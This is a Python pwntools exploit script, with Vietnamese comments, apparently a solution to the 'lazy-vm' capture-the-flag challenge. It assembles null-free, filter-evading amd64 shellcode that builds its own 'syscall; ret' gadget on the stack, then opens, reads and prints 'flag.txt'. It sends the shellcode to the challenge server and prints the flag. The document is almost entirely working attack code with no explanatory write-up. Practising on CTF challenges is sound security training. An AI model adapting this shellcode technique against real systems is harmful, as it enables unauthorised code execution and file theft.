from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Shellcode cuối cùng: Null-free và tự tạo syscall
shellcode = asm('''
    /* Bước 1: Tạo gadget 'syscall; ret' (0xc3050f) trên stack mà không dùng null */
    /* Dùng 'push' một số nhỏ, sau đó chỉnh sửa trên stack */
    push 0x61
    mov rbx, 0x0101010101010101
    mul rbx
    mov rbx, 0x6161616161c3050f
    xor rax, rbx
    push rax
    mov r15, rsp

    /* Bước 2: Tạo chuỗi "flag.txt" trên stack */
    xor rax, rax
    push rax
    mov rax, 0x7478742e67616c66
    push rax
    mov rdi, rsp

    /* Bước 3: Mở file (sys_open) */
    xor rsi, rsi
    xor rdx, rdx
    push 2
    pop rax
    call r15

    /* Bước 4: Đọc file (sys_read) */
    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    xor rdx, rdx
    mov dh, 1 
    xor rax, rax
    call r15

    /* Bước 5: In file (sys_write) */
    mov rdx, rax
    mov rsi, rsp
    push 1
    pop rdi
    push 1
    pop rax
    call r15
''')

print("Connecting to server...")
p = remote('lazy-vm.chal.idek.team', 1337)

p.recvuntil(b'Please enter your code:\n')
print("Sending final, null-free, anti-filter shellcode...")

p.sendline(shellcode)
print("Shellcode sent. Waiting for flag...")

flag = p.recvall(timeout=3)
print("\n--- FLAG ---")
print(flag.decode(errors='ignore'))
print("------------")